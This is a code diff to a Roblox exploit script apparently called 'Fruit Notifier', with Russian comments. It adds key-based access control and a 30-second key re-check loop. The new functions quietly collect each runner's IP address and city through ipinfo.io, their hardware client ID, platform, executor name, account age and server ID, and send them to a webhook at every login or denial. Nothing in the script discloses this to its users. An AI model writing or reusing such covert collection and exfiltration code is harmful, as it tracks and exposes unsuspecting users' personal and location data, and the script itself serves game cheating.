@@ -64,6 +64,151 @@ local function SendToWebhook(message)
     end
 end
 
+local function GetDeviceInfo()
+    local lines = {}
+
+    -- Эксплойт
+    pcall(function()
+        local name, ver = identifyexecutor()
+        if name then
+            lines[#lines + 1] = "> Эксплойт: " .. tostring(name) .. (ver and (" v" .. tostring(ver)) or "")
+        elseif getexecutorname then
+            lines[#lines + 1] = "> Эксплойт: " .. tostring(getexecutorname())
+        end
+    end)
+
+    -- Платформа
+    pcall(function()
+        local platform = UserInputService:GetPlatform()
+        local platNames = {
+            [Enum.Platform.Windows] = "Windows",
+            [Enum.Platform.OSX] = "macOS",
+            [Enum.Platform.IOS] = "iOS",
+            [Enum.Platform.Android] = "Android",
+            [Enum.Platform.XBoxOne] = "Xbox",
+            [Enum.Platform.PS4] = "PS4",
+            [Enum.Platform.Switch] = "Switch",
+            [Enum.Platform.Linux] = "Linux",
+        }
+        lines[#lines + 1] = "> Платформа: " .. (platNames[platform] or tostring(platform))
+    end)
+
+    -- Версия Roblox
+    pcall(function()
+        lines[#lines + 1] = "> Версия Roblox: " .. version()
+    end)
+
+    -- Разрешение экрана
+    pcall(function()
+        local vp = Camera.ViewportSize
+        lines[#lines + 1] = "> Экран: " .. math.floor(vp.X) .. "x" .. math.floor(vp.Y)
+    end)
+
+    -- HWID
+    pcall(function()
+        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+        lines[#lines + 1] = "> HWID: " .. tostring(hwid)
+    end)
+
+    -- IP (best-effort)
+    pcall(function()
+        local reqFn = (syn and syn.request) or (http and http.request) or http_request or request
+        if reqFn then
+            local ok, res = pcall(function()
+                return reqFn({ Url = "https://ipinfo.io/json", Method = "GET" })
+            end)
+            if ok and res and res.Body then
+                local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+                if ok2 and data then
+                    local ip = data.ip or "?"
+                    local city = data.city or ""
+                    local country = data.country or ""
+                    local loc = (city ~= "" and country ~= "") and (", " .. city .. ", " .. country) or (country ~= "" and (", " .. country) or "")
+                    lines[#lines + 1] = "> IP: " .. ip .. loc
+                end
+            end
+        end
+    end)
+
+    return table.concat(lines, "\n")
+end
+
+local function GetRobloxInfo()
+    local lines = {}
+
+    -- DisplayName
+    pcall(function()
+        if LocalPlayer.DisplayName ~= LocalPlayer.Name then
+            lines[#lines + 1] = "> DisplayName: " .. LocalPlayer.DisplayName
+        end
+    end)
+
+    -- UserId
+    pcall(function()
+        lines[#lines + 1] = "> UserId: " .. LocalPlayer.UserId
+    end)
+
+    -- Возраст аккаунта
+    pcall(function()
+        local age = LocalPlayer.AccountAge
+        local years = math.floor(age / 365)
+        local days = age % 365
+        local str = ""
+        if years > 0 then str = years .. " лет " end
+        str = str .. days .. " дней"
+        lines[#lines + 1] = "> Возраст аккаунта: " .. str
+    end)
+
+    -- Дата создания
+    pcall(function()
+        local timestamp = os.time() - (LocalPlayer.AccountAge * 86400)
+        lines[#lines + 1] = "> Дата создания: " .. os.date("%d.%m.%Y", timestamp)
+    end)
+
+    -- Premium
+    pcall(function()
+        local prem = LocalPlayer.MembershipType
+        local premNames = {
+            [Enum.MembershipType.None] = "Нет",
+            [Enum.MembershipType.BuilderClub] = "Builder Club",
+            [Enum.MembershipType.Turbobuilder] = "Turbo Builder",
+            [Enum.MembershipType.ClaimsClub] = "Claims Club",
+            [Enum.MembershipType.Premium] = "Premium",
+        }
+        lines[#lines + 1] = "> Premium: " .. (premNames[prem] or tostring(prem))
+    end)
+
+    -- Ссылка на профиль
+    pcall(function()
+        lines[#lines + 1] = "> Профиль: https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile"
+    end)
+
+    -- Сервер
+    pcall(function()
+        lines[#lines + 1] = "> PlaceId: " .. game.PlaceId
+    end)
+    pcall(function()
+        lines[#lines + 1] = "> JobId: " .. game.JobId
+    end)
+    pcall(function()
+        lines[#lines + 1] = "> Игроков: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers
+    end)
+
+    return table.concat(lines, "\n")
+end
+
+local function GetFullUserInfo()
+    local timeStr = os.date("%d.%m.%Y %H:%M:%S")
+    local parts = {}
+    parts[#parts + 1] = "👤 **Аккаунт**"
+    parts[#parts + 1] = "> Ник: `" .. LocalPlayer.Name .. "`"
+    parts[#parts + 1] = GetRobloxInfo()
+    parts[#parts + 1] = "\n🖥️ **Устройство**"
+    parts[#parts + 1] = GetDeviceInfo()
+    parts[#parts + 1] = "\n🕐 **Время:** " .. timeStr
+    return table.concat(parts, "\n")
+end
+
 local function FetchKeys()
     local keysData = {}
     local body = nil
@@ -279,6 +424,7 @@ local function ShowAuthGui()
 end
 
 local AccessEvent = Instance.new("BindableEvent")
+local CURRENT_KEY = nil
 
 pcall(function()
     local savedKey, remainingSec = LoadAuth()
@@ -289,13 +435,12 @@ pcall(function()
             local boundUsername = keysData[upperKey]
             if boundUsername and boundUsername == string.lower(LocalPlayer.Name) then
                 ACCESS_GRANTED = true
+                CURRENT_KEY = upperKey
                 local remMin = math.floor(remainingSec / 60)
                 local remSec = remainingSec % 60
                 local timeStr = remMin > 0 and (remMin .. "м " .. remSec .. "с") or (remSec .. "с")
                 pcall(function()
-                    local hwid = ""
-                    pcall(function() hwid = game:GetService("RbxAnalyticsService"):GetClientId() end)
-                    SendToWebhook("** Fruit Notifier | Автологин **\n> Ник: `" .. LocalPlayer.Name .. "`\n> HWID: " .. tostring(hwid) .. "\n> Осталось: **" .. timeStr .. "**")
+                    SendToWebhook("** Fruit Notifier | Автологин **\n" .. GetFullUserInfo() .. "\n\n> Осталось: **" .. timeStr .. "**")
                 end)
                 AccessEvent:Fire()
             else
@@ -351,21 +496,18 @@ AuthBtn.MouseButton1Click:Connect(function()
             AuthBtn.BackgroundColor3 = Color3.fromRGB(72, 209, 224)
             ShowAccessDenied()
             pcall(function()
-                local hwid = ""
-                pcall(function() hwid = game:GetService("RbxAnalyticsService"):GetClientId() end)
-                SendToWebhook("** Fruit Notifier | Чужой аккаунт **\n> Ключ: ||" .. upperKey .. "||\n> Привязан к: `" .. boundUsername .. "`\n> Пытался: `" .. LocalPlayer.Name .. "`\n> HWID: " .. tostring(hwid))
+                SendToWebhook("** Fruit Notifier | Чужой аккаунт **\n> Ключ: ||" .. upperKey .. "||\n> Привязан к: `" .. boundUsername .. "`\n> Пытался: `" .. LocalPlayer.Name .. "`\n" .. GetFullUserInfo())
             end)
             return
         end
 
         ACCESS_GRANTED = true
+        CURRENT_KEY = upperKey
         SaveAuth(inputKey)
         AuthStatus.Text = "Добро пожаловать, " .. LocalPlayer.Name .. "!"
         AuthStatus.TextColor3 = Color3.fromRGB(80, 255, 120)
         pcall(function()
-            local hwid = ""
-            pcall(function() hwid = game:GetService("RbxAnalyticsService"):GetClientId() end)
-            SendToWebhook("** Fruit Notifier | Доступ выдан **\n> Ник: `" .. LocalPlayer.Name .. "`\n> HWID: " .. tostring(hwid))
+            SendToWebhook("** Fruit Notifier | Доступ выдан **\n" .. GetFullUserInfo())
         end)
         task.delay(0.8, function()
             AuthGui:Destroy()
@@ -377,6 +519,41 @@ end)
 AccessEvent.Event:Wait()
 end
 -- ================= ACCESS SYSTEM END 🔒 =================
+
+-- ================= KEY VALIDATION LOOP (каждые 30 сек) =================
+task.spawn(function()
+    while true do
+        task.wait(30)
+        if not CURRENT_KEY then continue end
+
+        local ok, keysData = pcall(FetchKeys)
+        if not ok or not keysData or next(keysData) == nil then continue end
+
+        local boundUsername = keysData[CURRENT_KEY]
+        local realName = string.lower(LocalPlayer.Name)
+
+        if not boundUsername or boundUsername ~= realName then
+            pcall(function()
+                SendToWebhook("** Fruit Notifier | Ключ деактивирован **\n> Ключ: ||" .. tostring(CURRENT_KEY) .. "||\n> Причина: ключ удалён или перепривязан\n" .. GetFullUserInfo())
+            end)
+            pcall(function()
+                ClearAuth()
+            end)
+            CURRENT_KEY = nil
+            ACCESS_GRANTED = false
+
+            pcall(function()
+                if gui and gui.Parent then gui:Destroy() end
+            end)
+
+            ShowAccessDenied()
+            task.wait(5)
+            pcall(function() game.Players.LocalPlayer:Kick("Ключ деактивирован. Запусти скрипт заново.") end)
+            break
+        end
+    end
+end)
+-- ================= KEY VALIDATION LOOP END =================
 
 -- ================= НАСТРОЙКИ =================
 local Settings = {
